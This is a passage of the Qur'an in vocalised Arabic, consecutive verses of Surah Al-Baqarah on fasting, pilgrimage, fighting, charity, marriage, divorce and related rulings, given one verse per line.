اِنَّ الَّذِيْنَ يَكْتُمُوْنَ مَآ اَنْزَلَ اللّٰهُ مِنَ الْكِتٰبِ وَيَشْتَرُوْنَ بِهٖ ثَمَنًا قَلِيْلًا ۙ اُولٰۤىِٕكَ مَا يَأْكُلُوْنَ فِيْ بُطُوْنِهِمْ اِلَّا النَّارَ وَلَا يُكَلِّمُهُمُ اللّٰهُ يَوْمَ الْقِيٰمَةِ وَلَا يُزَكِّيْهِمْ ۚ وَلَهُمْ عَذَابٌ اَلِيْمٌ
اُولٰۤىِٕكَ الَّذِيْنَ اشْتَرَوُا الضَّلٰلَةَ بِالْهُدٰى وَالْعَذَابَ بِالْمَغْفِرَةِ ۚ فَمَآ اَصْبَرَهُمْ عَلَى النَّارِ
ذٰلِكَ بِاَنَّ اللّٰهَ نَزَّلَ الْكِتٰبَ بِالْحَقِّ ۗ وَاِنَّ الَّذِيْنَ اخْتَلَفُوْا فِى الْكِتٰبِ لَفِيْ شِقَاقٍۢ بَعِيْدٍ
لَيْسَ الْبِرَّ اَنْ تُوَلُّوْا وُجُوْهَكُمْ قِبَلَ الْمَشْرِقِ وَالْمَغْرِبِ وَلٰكِنَّ الْبِرَّ مَنْ اٰمَنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَالْمَلٰۤىِٕكَةِ وَالْكِتٰبِ وَالنَّبِيّٖنَ ۚ وَاٰتَى الْمَالَ عَلٰى حُبِّهٖ ذَوِى الْقُرْبٰى وَالْيَتٰمٰى وَالْمَسٰكِيْنَ وَابْنَ السَّبِيْلِۙ وَالسَّاۤىِٕلِيْنَ وَفِى الرِّقَابِ ۚ وَاَقَامَ الصَّلٰوةَ وَاٰتَى الزَّكٰوةَ ۚ وَالْمُوْفُوْنَ بِعَهْدِهِمْ اِذَا عٰهَدُوْا ۚ وَالصّٰبِرِيْنَ فِى الْبَأْسَاۤءِ وَالضَّرَّاۤءِ وَحِيْنَ الْبَأْسِ ۗ اُولٰۤىِٕكَ الَّذِيْنَ صَدَقُوْا ۚ وَاُولٰۤىِٕكَ هُمُ الْمُتَّقُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا كُتِبَ عَلَيْكُمُ الْقِصَاصُ فِى الْقَتْلٰى ۗ اَلْحُرُّ بِالْحُرِّ وَالْعَبْدُ بِالْعَبْدِ وَالْاُنْثٰى بِالْاُنْثٰى ۗ فَمَنْ عُفِيَ لَهٗ مِنْ اَخِيْهِ شَيْءٌ فَاتِّبَاعٌۢ بِالْمَعْرُوْفِ وَاَدَاۤءٌ اِلَيْهِ بِاِحْسَانٍ ۗ ذٰلِكَ تَخْفِيْفٌ مِّنْ رَّبِّكُمْ وَرَحْمَةٌ ۗ فَمَنِ اعْتَدٰى بَعْدَ ذٰلِكَ فَلَهٗ عَذَابٌ اَلِيْمٌ
وَلَكُمْ فِى الْقِصَاصِ حَيٰوةٌ يّٰٓاُولِى الْاَلْبَابِ لَعَلَّكُمْ تَتَّقُوْنَ
كُتِبَ عَلَيْكُمْ اِذَا حَضَرَ اَحَدَكُمُ الْمَوْتُ اِنْ تَرَكَ خَيْرًا ۖ اۨلْوَصِيَّةُ لِلْوَالِدَيْنِ وَالْاَقْرَبِيْنَ بِالْمَعْرُوْفِ ۚ حَقًّا عَلَى الْمُتَّقِيْنَ
فَمَنْۢ بَدَّلَهٗ بَعْدَمَا سَمِعَهٗ فَاِنَّمَآ اِثْمُهٗ عَلَى الَّذِيْنَ يُبَدِّلُوْنَهٗ ۗ اِنَّ اللّٰهَ سَمِيْعٌ عَلِيْمٌ
فَمَنْ خَافَ مِنْ مُّوْصٍ جَنَفًا اَوْ اِثْمًا فَاَصْلَحَ بَيْنَهُمْ فَلَآ اِثْمَ عَلَيْهِ ۗ اِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا كُتِبَ عَلَيْكُمُ الصِّيَامُ كَمَا كُتِبَ عَلَى الَّذِيْنَ مِنْ قَبْلِكُمْ لَعَلَّكُمْ تَتَّقُوْنَۙ
اَيَّامًا مَّعْدُوْدٰتٍ ۗ فَمَنْ كَانَ مِنْكُمْ مَّرِيْضًا اَوْ عَلٰى سَفَرٍ فَعِدَّةٌ مِّنْ اَيَّامٍ اُخَرَ ۗ وَعَلَى الَّذِيْنَ يُطِيْقُوْنَهٗ فِدْيَةٌ طَعَامُ مِسْكِيْنٍ ۗ فَمَنْ تَطَوَّعَ خَيْرًا فَهُوَ خَيْرٌ لَّهٗ ۗ وَاَنْ تَصُوْمُوْا خَيْرٌ لَّكُمْ اِنْ كُنْتُمْ تَعْلَمُوْنَ
شَهْرُ رَمَضَانَ الَّذِيْٓ اُنْزِلَ فِيْهِ الْقُرْاٰنُ هُدًى لِّلنَّاسِ وَبَيِّنٰتٍ مِّنَ الْهُدٰى وَالْفُرْقَانِ ۚ فَمَنْ شَهِدَ مِنْكُمُ الشَّهْرَ فَلْيَصُمْهُ ۗ وَمَنْ كَانَ مَرِيْضًا اَوْ عَلٰى سَفَرٍ فَعِدَّةٌ مِّنْ اَيَّامٍ اُخَرَ ۗ يُرِيْدُ اللّٰهُ بِكُمُ الْيُسْرَ وَلَا يُرِيْدُ بِكُمُ الْعُسْرَ ۖ وَلِتُكْمِلُوا الْعِدَّةَ وَلِتُكَبِّرُوا اللّٰهَ عَلٰى مَا هَدٰىكُمْ وَلَعَلَّكُمْ تَشْكُرُوْنَ
وَاِذَا سَاَلَكَ عِبَادِيْ عَنِّيْ فَاِنِّيْ قَرِيْبٌ ۗ اُجِيْبُ دَعْوَةَ الدَّاعِ اِذَا دَعَانِ ۙ فَلْيَسْتَجِيْبُوْا لِيْ وَلْيُؤْمِنُوْا بِيْ لَعَلَّهُمْ يَرْشُدُوْنَ
اُحِلَّ لَكُمْ لَيْلَةَ الصِّيَامِ الرَّفَثُ اِلٰى نِسَاۤىِٕكُمْ ۗ هُنَّ لِبَاسٌ لَّكُمْ وَاَنْتُمْ لِبَاسٌ لَّهُنَّ ۗ عَلِمَ اللّٰهُ اَنَّكُمْ كُنْتُمْ تَخْتَانُوْنَ اَنْفُسَكُمْ فَتَابَ عَلَيْكُمْ وَعَفَا عَنْكُمْ ۚ فَالْـٰٔنَ بَاشِرُوْهُنَّ وَابْتَغُوْا مَا كَتَبَ اللّٰهُ لَكُمْ ۚ وَكُلُوْا وَاشْرَبُوْا حَتّٰى يَتَبَيَّنَ لَكُمُ الْخَيْطُ الْاَبْيَضُ مِنَ الْخَيْطِ الْاَسْوَدِ مِنَ الْفَجْرِ ۖ ثُمَّ اَتِمُّوا الصِّيَامَ اِلَى الَّيْلِ ۚ وَلَا تُبَاشِرُوْهُنَّ وَاَنْتُمْ عٰكِفُوْنَۙ فِى الْمَسٰجِدِ ۗ تِلْكَ حُدُوْدُ اللّٰهِ فَلَا تَقْرَبُوْهَا ۗ كَذٰلِكَ يُبَيِّنُ اللّٰهُ اٰيٰتِهٖ لِلنَّاسِ لَعَلَّهُمْ يَتَّقُوْنَ
وَلَا تَأْكُلُوْٓا اَمْوَالَكُمْ بَيْنَكُمْ بِالْبَاطِلِ وَتُدْلُوْا بِهَآ اِلَى الْحُكَّامِ لِتَأْكُلُوْا فَرِيْقًا مِّنْ اَمْوَالِ النَّاسِ بِالْاِثْمِ وَاَنْتُمْ تَعْلَمُوْنَ
يَسْـَٔلُوْنَكَ عَنِ الْاَهِلَّةِ ۗ قُلْ هِيَ مَوَاقِيْتُ لِلنَّاسِ وَالْحَجِّ ۗ وَلَيْسَ الْبِرُّ بِاَنْ تَأْتُوا الْبُيُوْتَ مِنْ ظُهُوْرِهَا وَلٰكِنَّ الْبِرَّ مَنِ اتَّقٰى ۚ وَأْتُوا الْبُيُوْتَ مِنْ اَبْوَابِهَا ۖ وَاتَّقُوا اللّٰهَ لَعَلَّكُمْ تُفْلِحُوْنَ
وَقَاتِلُوْا فِيْ سَبِيْلِ اللّٰهِ الَّذِيْنَ يُقَاتِلُوْنَكُمْ وَلَا تَعْتَدُوْا ۗ اِنَّ اللّٰهَ لَا يُحِبُّ الْمُعْتَدِيْنَ
وَاقْتُلُوْهُمْ حَيْثُ ثَقِفْتُمُوْهُمْ وَاَخْرِجُوْهُمْ مِّنْ حَيْثُ اَخْرَجُوْكُمْ ۚ وَالْفِتْنَةُ اَشَدُّ مِنَ الْقَتْلِ ۚ وَلَا تُقَاتِلُوْهُمْ عِنْدَ الْمَسْجِدِ الْحَرَامِ حَتّٰى يُقَاتِلُوْكُمْ فِيْهِ ۚ فَاِنْ قَاتَلُوْكُمْ فَاقْتُلُوْهُمْ ۗ كَذٰلِكَ جَزَاۤءُ الْكٰفِرِيْنَ
فَاِنِ انْتَهَوْا فَاِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
وَقَاتِلُوْهُمْ حَتّٰى لَا تَكُوْنَ فِتْنَةٌ وَّيَكُوْنَ الدِّيْنُ لِلّٰهِ ۗ فَاِنِ انْتَهَوْا فَلَا عُدْوَانَ اِلَّا عَلَى الظّٰلِمِيْنَ
اَلشَّهْرُ الْحَرَامُ بِالشَّهْرِ الْحَرَامِ وَالْحُرُمٰتُ قِصَاصٌ ۗ فَمَنِ اعْتَدٰى عَلَيْكُمْ فَاعْتَدُوْا عَلَيْهِ بِمِثْلِ مَا اعْتَدٰى عَلَيْكُمْ ۖ وَاتَّقُوا اللّٰهَ وَاعْلَمُوْٓا اَنَّ اللّٰهَ مَعَ الْمُتَّقِيْنَ
وَاَنْفِقُوْا فِيْ سَبِيْلِ اللّٰهِ وَلَا تُلْقُوْا بِاَيْدِيْكُمْ اِلَى التَّهْلُكَةِ ۖ وَاَحْسِنُوْا ۚ اِنَّ اللّٰهَ يُحِبُّ الْمُحْسِنِيْنَ
وَاَتِمُّوا الْحَجَّ وَالْعُمْرَةَ لِلّٰهِ ۗ فَاِنْ اُحْصِرْتُمْ فَمَا اسْتَيْسَرَ مِنَ الْهَدْيِ ۚ وَلَا تَحْلِقُوْا رُءُوْسَكُمْ حَتّٰى يَبْلُغَ الْهَدْيُ مَحِلَّهٗ ۗ فَمَنْ كَانَ مِنْكُمْ مَّرِيْضًا اَوْ بِهٖٓ اَذًى مِّنْ رَّأْسِهٖ فَفِدْيَةٌ مِّنْ صِيَامٍ اَوْ صَدَقَةٍ اَوْ نُسُكٍ ۚ فَاِذَآ اَمِنْتُمْ فَمَنْ تَمَتَّعَ بِالْعُمْرَةِ اِلَى الْحَجِّ فَمَا اسْتَيْسَرَ مِنَ الْهَدْيِ ۚ فَمَنْ لَّمْ يَجِدْ فَصِيَامُ ثَلٰثَةِ اَيَّامٍ فِى الْحَجِّ وَسَبْعَةٍ اِذَا رَجَعْتُمْ ۗ تِلْكَ عَشَرَةٌ كَامِلَةٌ ۗ ذٰلِكَ لِمَنْ لَّمْ يَكُنْ اَهْلُهٗ حَاضِرِى الْمَسْجِدِ الْحَرَامِ ۗ وَاتَّقُوا اللّٰهَ وَاعْلَمُوْٓا اَنَّ اللّٰهَ شَدِيْدُ الْعِقَابِ
اَلْحَجُّ اَشْهُرٌ مَّعْلُوْمٰتٌ ۚ فَمَنْ فَرَضَ فِيْهِنَّ الْحَجَّ فَلَا رَفَثَ وَلَا فُسُوْقَ وَلَا جِدَالَ فِى الْحَجِّ ۗ وَمَا تَفْعَلُوْا مِنْ خَيْرٍ يَّعْلَمْهُ اللّٰهُ ۗ وَتَزَوَّدُوْا فَاِنَّ خَيْرَ الزَّادِ التَّقْوٰى ۖ وَاتَّقُوْنِ يٰٓاُولِى الْاَلْبَابِ
لَيْسَ عَلَيْكُمْ جُنَاحٌ اَنْ تَبْتَغُوْا فَضْلًا مِّنْ رَّبِّكُمْ ۗ فَاِذَآ اَفَضْتُمْ مِّنْ عَرَفٰتٍ فَاذْكُرُوا اللّٰهَ عِنْدَ الْمَشْعَرِ الْحَرَامِ ۖ وَاذْكُرُوْهُ كَمَا هَدٰىكُمْ ۚ وَاِنْ كُنْتُمْ مِّنْ قَبْلِهٖ لَمِنَ الضَّاۤلِّيْنَ
ثُمَّ اَفِيْضُوْا مِنْ حَيْثُ اَفَاضَ النَّاسُ وَاسْتَغْفِرُوا اللّٰهَ ۗ اِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
فَاِذَا قَضَيْتُمْ مَّنَاسِكَكُمْ فَاذْكُرُوا اللّٰهَ كَذِكْرِكُمْ اٰبَاۤءَكُمْ اَوْ اَشَدَّ ذِكْرًا ۗ فَمِنَ النَّاسِ مَنْ يَّقُوْلُ رَبَّنَآ اٰتِنَا فِى الدُّنْيَا وَمَا لَهٗ فِى الْاٰخِرَةِ مِنْ خَلَاقٍ
وَمِنْهُمْ مَّنْ يَّقُوْلُ رَبَّنَآ اٰتِنَا فِى الدُّنْيَا حَسَنَةً وَّفِى الْاٰخِرَةِ حَسَنَةً وَّقِنَا عَذَابَ النَّارِ
اُولٰۤىِٕكَ لَهُمْ نَصِيْبٌ مِّمَّا كَسَبُوْا ۗ وَاللّٰهُ سَرِيْعُ الْحِسَابِ
وَاذْكُرُوا اللّٰهَ فِيْٓ اَيَّامٍ مَّعْدُوْدٰتٍ ۗ فَمَنْ تَعَجَّلَ فِيْ يَوْمَيْنِ فَلَا اِثْمَ عَلَيْهِ ۚ وَمَنْ تَاَخَّرَ فَلَا اِثْمَ عَلَيْهِ ۙ لِمَنِ اتَّقٰى ۗ وَاتَّقُوا اللّٰهَ وَاعْلَمُوْٓا اَنَّكُمْ اِلَيْهِ تُحْشَرُوْنَ
وَمِنَ النَّاسِ مَنْ يُّعْجِبُكَ قَوْلُهٗ فِى الْحَيٰوةِ الدُّنْيَا وَيُشْهِدُ اللّٰهَ عَلٰى مَا فِيْ قَلْبِهٖۙ وَهُوَ اَلَدُّ الْخِصَامِ
وَاِذَا تَوَلّٰى سَعٰى فِى الْاَرْضِ لِيُفْسِدَ فِيْهَا وَيُهْلِكَ الْحَرْثَ وَالنَّسْلَ ۗ وَاللّٰهُ لَا يُحِبُّ الْفَسَادَ
وَاِذَا قِيْلَ لَهُ اتَّقِ اللّٰهَ اَخَذَتْهُ الْعِزَّةُ بِالْاِثْمِ فَحَسْبُهٗ جَهَنَّمُ ۗ وَلَبِئْسَ الْمِهَادُ
وَمِنَ النَّاسِ مَنْ يَّشْرِيْ نَفْسَهُ ابْتِغَاۤءَ مَرْضَاتِ اللّٰهِ ۗ وَاللّٰهُ رَءُوْفٌۢ بِالْعِبَادِ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا ادْخُلُوْا فِى السِّلْمِ كَاۤفَّةً ۖ وَلَا تَتَّبِعُوْا خُطُوٰتِ الشَّيْطٰنِ ۗ اِنَّهٗ لَكُمْ عَدُوٌّ مُّبِيْنٌ
فَاِنْ زَلْتُمْ مِّنْۢ بَعْدِ مَا جَاۤءَتْكُمُ الْبَيِّنٰتُ فَاعْلَمُوْٓا اَنَّ اللّٰهَ عَزِيْزٌ حَكِيْمٌ
هَلْ يَنْظُرُوْنَ اِلَّآ اَنْ يَّأْتِيَهُمُ اللّٰهُ فِيْ ظُلَلٍ مِّنَ الْغَمَامِ وَالْمَلٰۤىِٕكَةُ وَقُضِيَ الْاَمْرُ ۗ وَاِلَى اللّٰهِ تُرْجَعُ الْاُمُوْرُ
سَلْ بَنِيْٓ اِسْرَاۤءِيْلَ كَمْ اٰتَيْنٰهُمْ مِّنْ اٰيَةٍ ۢ بَيِّنَةٍ ۗ وَمَنْ يُّبَدِّلْ نِعْمَةَ اللّٰهِ مِنْۢ بَعْدِ مَا جَاۤءَتْهُ فَاِنَّ اللّٰهَ شَدِيْدُ الْعِقَابِ
زُيِّنَ لِلَّذِيْنَ كَفَرُوا الْحَيٰوةُ الدُّنْيَا وَيَسْخَرُوْنَ مِنَ الَّذِيْنَ اٰمَنُوْا ۘ وَالَّذِيْنَ اتَّقَوْا فَوْقَهُمْ يَوْمَ الْقِيٰمَةِ ۗ وَاللّٰهُ يَرْزُقُ مَنْ يَّشَاۤءُ بِغَيْرِ حِسَابٍ
كَانَ النَّاسُ اُمَّةً وَّاحِدَةً فَبَعَثَ اللّٰهُ النَّبِيّٖنَ مُبَشِّرِيْنَ وَمُنْذِرِيْنَ ۖ وَاَنْزَلَ مَعَهُمُ الْكِتٰبَ بِالْحَقِّ لِيَحْكُمَ بَيْنَ النَّاسِ فِيْمَا اخْتَلَفُوْا فِيْهِ ۗ وَمَا اخْتَلَفَ فِيْهِ اِلَّا الَّذِيْنَ اُوْتُوْهُ مِنْۢ بَعْدِ مَا جَاۤءَتْهُمُ الْبَيِّنٰتُ بَغْيًاۢ بَيْنَهُمْ ۚ فَهَدَى اللّٰهُ الَّذِيْنَ اٰمَنُوْا لِمَا اخْتَلَفُوْا فِيْهِ مِنَ الْحَقِّ بِاِذْنِهٖ ۗ وَاللّٰهُ يَهْدِيْ مَنْ يَّشَاۤءُ اِلٰى صِرَاطٍ مُّسْتَقِيْمٍ
اَمْ حَسِبْتُمْ اَنْ تَدْخُلُوا الْجَنَّةَ وَلَمَّا يَأْتِكُمْ مَّثَلُ الَّذِيْنَ خَلَوْا مِنْ قَبْلِكُمْ ۗ مَسَّتْهُمُ الْبَأْسَاۤءُ وَالضَّرَّاۤءُ وَزُلْزِلُوْا حَتّٰى يَقُوْلَ الرَّسُوْلُ وَالَّذِيْنَ اٰمَنُوْا مَعَهٗ مَتٰى نَصْرُ اللّٰهِ ۗ اَلَآ اِنَّ نَصْرَ اللّٰهِ قَرِيْبٌ
يَسْـَٔلُوْنَكَ مَاذَا يُنْفِقُوْنَ ۗ قُلْ مَآ اَنْفَقْتُمْ مِّنْ خَيْرٍ فَلِلْوَالِدَيْنِ وَالْاَقْرَبِيْنَ وَالْيَتٰمٰى وَالْمَسٰكِيْنِ وَابْنِ السَّبِيْلِ ۗ وَمَا تَفْعَلُوْا مِنْ خَيْرٍ فَاِنَّ اللّٰهَ بِهٖ عَلِيْمٌ
كُتِبَ عَلَيْكُمُ الْقِتَالُ وَهُوَ كُرْهٌ لَّكُمْ ۚ وَعَسٰٓى اَنْ تَكْرَهُوْا شَيْـًٔا وَّهُوَ خَيْرٌ لَّكُمْ ۚ وَعَسٰٓى اَنْ تُحِبُّوْا شَيْـًٔا وَّهُوَ شَرٌّ لَّكُمْ ۗ وَاللّٰهُ يَعْلَمُ وَاَنْتُمْ لَا تَعْلَمُوْنَ
يَسْـَٔلُوْنَكَ عَنِ الشَّهْرِ الْحَرَامِ قِتَالٍ فِيْهِ ۗ قُلْ قِتَالٌ فِيْهِ كَبِيْرٌ ۗ وَصَدٌّ عَنْ سَبِيْلِ اللّٰهِ وَكُفْرٌۢ بِهٖ وَالْمَسْجِدِ الْحَرَامِ وَاِخْرَاجُ اَهْلِهٖ مِنْهُ اَكْبَرُ عِنْدَ اللّٰهِ ۚ وَالْفِتْنَةُ اَكْبَرُ مِنَ الْقَتْلِ ۗ وَلَا يَزَالُوْنَ يُقَاتِلُوْنَكُمْ حَتّٰى يَرُدُّوْكُمْ عَنْ دِيْنِكُمْ اِنِ اسْتَطَاعُوْا ۗ وَمَنْ يَّرْتَدِدْ مِنْكُمْ عَنْ دِيْنِهٖ فَيَمُتْ وَهُوَ كَافِرٌ فَاُولٰۤىِٕكَ حَبِطَتْ اَعْمَالُهُمْ فِى الدُّنْيَا وَالْاٰخِرَةِ ۚ وَاُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
اِنَّ الَّذِيْنَ اٰمَنُوْا وَالَّذِيْنَ هَاجَرُوْا وَجَاهَدُوْا فِيْ سَبِيْلِ اللّٰهِ ۙ اُولٰۤىِٕكَ يَرْجُوْنَ رَحْمَتَ اللّٰهِ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
يَسْـَٔلُوْنَكَ عَنِ الْخَمْرِ وَالْمَيْسِرِ ۗ قُلْ فِيْهِمَآ اِثْمٌ كَبِيْرٌ وَّمَنَافِعُ لِلنَّاسِ ۖ وَاِثْمُهُمَآ اَكْبَرُ مِنْ نَّفْعِهِمَا ۗ وَيَسْـَٔلُوْنَكَ مَاذَا يُنْفِقُوْنَ ۗ قُلِ الْعَفْوَ ۗ كَذٰلِكَ يُبَيِّنُ اللّٰهُ لَكُمُ الْاٰيٰتِ لَعَلَّكُمْ تَتَفَكَّرُوْنَ
فِى الدُّنْيَا وَالْاٰخِرَةِ ۗ وَيَسْـَٔلُوْنَكَ عَنِ الْيَتٰمٰى ۗ قُلْ اِصْلَاحٌ لَّهُمْ خَيْرٌ ۗ وَاِنْ تُخَالِطُوْهُمْ فَاِخْوَانُكُمْ ۗ وَاللّٰهُ يَعْلَمُ الْمُفْسِدَ مِنَ الْمُصْلِحِ ۗ وَلَوْ شَاۤءَ اللّٰهُ لَاَعْنَتَكُمْ ۗ اِنَّ اللّٰهَ عَزِيْزٌ حَكِيْمٌ
وَلَا تَنْكِحُوا الْمُشْرِكٰتِ حَتّٰى يُؤْمِنَّ ۗ وَلَاَمَةٌ مُّؤْمِنَةٌ خَيْرٌ مِّنْ مُّشْرِكَةٍ وَّلَوْ اَعْجَبَتْكُمْ ۗ وَلَا تُنْكِحُوا الْمُشْرِكِيْنَ حَتّٰى يُؤْمِنُوْا ۗ وَلَعَبْدٌ مُّؤْمِنٌ خَيْرٌ مِّنْ مُّشْرِكٍ وَّلَوْ اَعْجَبَكُمْ ۗ اُولٰۤىِٕكَ يَدْعُوْنَ اِلَى النَّارِ ۖ وَاللّٰهُ يَدْعُوْٓا اِلَى الْجَنَّةِ وَالْمَغْفِرَةِ بِاِذْنِهٖ ۚ وَيُبَيِّنُ اٰيٰتِهٖ لِلنَّاسِ لَعَلَّهُمْ يَتَذَكَّرُوْنَ
وَيَسْـَٔلُوْنَكَ عَنِ الْمَحِيْضِ ۗ قُلْ هُوَ اَذًى فَاعْتَزِلُوا النِّسَاۤءَ فِى الْمَحِيْضِ ۙ وَلَا تَقْرَبُوْهُنَّ حَتّٰى يَطْهُرْنَ ۚ فَاِذَا تَطَهَّرْنَ فَأْتُوْهُنَّ مِنْ حَيْثُ اَمَرَكُمُ اللّٰهُ ۗ اِنَّ اللّٰهَ يُحِبُّ التَّوَّابِيْنَ وَيُحِبُّ الْمُتَطَهِّرِيْنَ
نِسَاۤؤُكُمْ حَرْثٌ لَّكُمْ ۖ فَأْتُوْا حَرْثَكُمْ اَنّٰى شِئْتُمْ ۖ وَقَدِّمُوْا لِاَنْفُسِكُمْ ۗ وَاتَّقُوا اللّٰهَ وَاعْلَمُوْٓا اَنَّكُمْ مُّلٰقُوْهُ ۗ وَبَشِّرِ الْمُؤْمِنِيْنَ
وَلَا تَجْعَلُوا اللّٰهَ عُرْضَةً لِّاَيْمَانِكُمْ اَنْ تَبَرُّوْا وَتَتَّقُوْا وَتُصْلِحُوْا بَيْنَ النَّاسِ ۗ وَاللّٰهُ سَمِيْعٌ عَلِيْمٌ
لَا يُؤَاخِذُكُمُ اللّٰهُ بِاللَّغْوِ فِيْٓ اَيْمَانِكُمْ وَلٰكِنْ يُّؤَاخِذُكُمْ بِمَا كَسَبَتْ قُلُوْبُكُمْ ۗ وَاللّٰهُ غَفُوْرٌ حَلِيْمٌ
لِّلَّذِيْنَ يُؤْلُوْنَ مِنْ نِّسَاۤىِٕهِمْ تَرَبُّصُ اَرْبَعَةِ اَشْهُرٍ ۚ فَاِنْ فَاۤءُوْ فَاِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
وَاِنْ عَزَمُوا الطَّلَاقَ فَاِنَّ اللّٰهَ سَمِيْعٌ عَلِيْمٌ
وَالْمُطَلَّقٰتُ يَتَرَبَّصْنَ بِاَنْفُسِهِنَّ ثَلٰثَةَ قُرُوْۤءٍ ۗ وَلَا يَحِلُّ لَهُنَّ اَنْ يَّكْتُمْنَ مَا خَلَقَ اللّٰهُ فِيْٓ اَرْحَامِهِنَّ اِنْ كُنَّ يُؤْمِنَّ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ ۗ وَبُعُوْلَتُهُنَّ اَحَقُّ بِرَدِّهِنَّ فِيْ ذٰلِكَ اِنْ اَرَادُوْٓا اِصْلَاحًا ۗ وَلَهُنَّ مِثْلُ الَّذِيْ عَلَيْهِنَّ بِالْمَعْرُوْفِ ۖ وَلِلرِّجَالِ عَلَيْهِنَّ دَرَجَةٌ ۗ وَاللّٰهُ عَزِيْزٌ حَكِيْمٌ
اَلطَّلَاقُ مَرَّتٰنِ ۖ فَاِمْسَاكٌۢ بِمَعْرُوْفٍ اَوْ تَسْرِيْحٌۢ بِاِحْسَانٍ ۗ وَلَا يَحِلُّ لَكُمْ اَنْ تَأْخُذُوْا مِمَّآ اٰتَيْتُمُوْهُنَّ شَيْـًٔا اِلَّآ اَنْ يَّخَافَآ اَلَّا يُقِيْمَا حُدُوْدَ اللّٰهِ ۗ فَاِنْ خِفْتُمْ اَلَّا يُقِيْمَا حُدُوْدَ اللّٰهِ ۙ فَلَا جُنَاحَ عَلَيْهِمَا فِيْمَا افْتَدَتْ بِهٖ ۗ تِلْكَ حُدُوْدُ اللّٰهِ فَلَا تَعْتَدُوْهَا ۚ وَمَنْ يَّتَعَدَّ حُدُوْدَ اللّٰهِ فَاُولٰۤىِٕكَ هُمُ الظّٰلِمُوْنَ
فَاِنْ طَلَّقَهَا فَلَا تَحِلُّ لَهٗ مِنْۢ بَعْدُ حَتّٰى تَنْكِحَ زَوْجًا غَيْرَهٗ ۗ فَاِنْ طَلَّقَهَا فَلَا جُنَاحَ عَلَيْهِمَآ اَنْ يَّتَرَاجَعَآ اِنْ ظَنَّآ اَنْ يُّقِيْمَا حُدُوْدَ اللّٰهِ ۗ وَتِلْكَ حُدُوْدُ اللّٰهِ يُبَيِّنُهَا لِقَوْمٍ يَّعْلَمُوْنَ
وَاِذَا طَلَّقْتُمُ النِّسَاۤءَ فَبَلَغْنَ اَجَلَهُنَّ فَاَمْسِكُوْهُنَّ بِمَعْرُوْفٍ اَوْ سَرِّحُوْهُنَّ بِمَعْرُوْفٍ ۖ وَلَا تُمْسِكُوْهُنَّ ضِرَارًا لِّتَعْتَدُوْا ۚ وَمَنْ يَّفْعَلْ ذٰلِكَ فَقَدْ ظَلَمَ نَفْسَهٗ ۗ وَلَا تَتَّخِذُوْٓا اٰيٰتِ اللّٰهِ هُزُوًا ۖ وَاذْكُرُوْا نِعْمَتَ اللّٰهِ عَلَيْكُمْ وَمَآ اَنْزَلَ عَلَيْكُمْ مِّنَ الْكِتٰبِ وَالْحِكْمَةِ يَعِظُكُمْ بِهٖ ۗ وَاتَّقُوا اللّٰهَ وَاعْلَمُوْٓا اَنَّ اللّٰهَ بِكُلِّ شَيْءٍ عَلِيْمٌ
وَاِذَا طَلَّقْتُمُ النِّسَاۤءَ فَبَلَغْنَ اَجَلَهُنَّ فَلَا تَعْضُلُوْهُنَّ اَنْ يَّنْكِحْنَ اَزْوَاجَهُنَّ اِذَا تَرَاضَوْا بَيْنَهُمْ بِالْمَعْرُوْفِ ۗ ذٰلِكَ يُوْعَظُ بِهٖ مَنْ كَانَ مِنْكُمْ يُؤْمِنُ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ ۗ ذٰلِكُمْ اَزْكٰى لَكُمْ وَاَطْهَرُ ۗ وَاللّٰهُ يَعْلَمُ وَاَنْتُمْ لَا تَعْلَمُوْنَ
وَالْوَالِدٰتُ يُرْضِعْنَ اَوْلَادَهُنَّ حَوْلَيْنِ كَامِلَيْنِ لِمَنْ اَرَادَ اَنْ يُّتِمَّ الرَّضَاعَةَ ۗ وَعَلَى الْمَوْلُوْدِ لَهٗ رِزْقُهُنَّ وَكِسْوَتُهُنَّ بِالْمَعْرُوْفِ ۗ لَا تُكَلَّفُ نَفْسٌ اِلَّا وُسْعَهَا ۚ لَا تُضَاۤرَّ وَالِدَةٌ ۢ بِوَلَدِهَا وَلَا مَوْلُوْدٌ لَّهٗ بِوَلَدِهٖ ۖ وَعَلَى الْوَارِثِ مِثْلُ ذٰلِكَ ۗ فَاِنْ اَرَادَا فِصَالًا عَنْ تَرَاضٍ مِّنْهُمَا وَتَشَاوُرٍ فَلَا جُنَاحَ عَلَيْهِمَا ۗ وَاِنْ اَرَدْتُّمْ اَنْ تَسْتَرْضِعُوْٓا اَوْلَادَكُمْ فَلَا جُنَاحَ عَلَيْكُمْ اِذَا سَلَّمْتُمْ مَّآ اٰتَيْتُمْ بِالْمَعْرُوْفِ ۗ وَاتَّقُوا اللّٰهَ وَاعْلَمُوْٓا اَنَّ اللّٰهَ بِمَا تَعْمَلُوْنَ بَصِيْرٌ
وَالَّذِيْنَ يُتَوَفَّوْنَ مِنْكُمْ وَيَذَرُوْنَ اَزْوَاجًا يَّتَرَبَّصْنَ بِاَنْفُسِهِنَّ اَرْبَعَةَ اَشْهُرٍ وَّعَشْرًا ۚ فَاِذَا بَلَغْنَ اَجَلَهُنَّ فَلَا جُنَاحَ عَلَيْكُمْ فِيْمَا فَعَلْنَ فِيْٓ اَنْفُسِهِنَّ بِالْمَعْرُوْفِ ۗ وَاللّٰهُ بِمَا تَعْمَلُوْنَ خَبِيْرٌ
